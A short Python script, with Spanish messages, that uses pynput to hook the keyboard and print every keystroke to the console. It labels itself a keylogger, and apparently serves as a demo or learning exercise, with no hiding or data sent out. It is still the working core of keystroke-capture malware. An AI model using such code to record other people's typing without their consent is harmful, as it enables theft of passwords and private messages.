from pynput import keyboard
import sys

print(">>> INICIALIZANDO GANCHO (HOOK)...", flush=True)

def al_presionar(tecla):
    try:
        print(f'Alfanumérica: {tecla.char}', flush=True)
    except AttributeError:
        print(f'Especial: {tecla}', flush=True)

escuchador = keyboard.Listener(on_press=al_presionar)

print(">>> KEYLOGGER CORRIENDO, ESCRIBE ALGO...", flush=True)

try:
    with escuchador:
        escuchador.join()
except KeyboardInterrupt:
    print(">>> KEYLOGGER DETENIDO POR EL USUARIO.")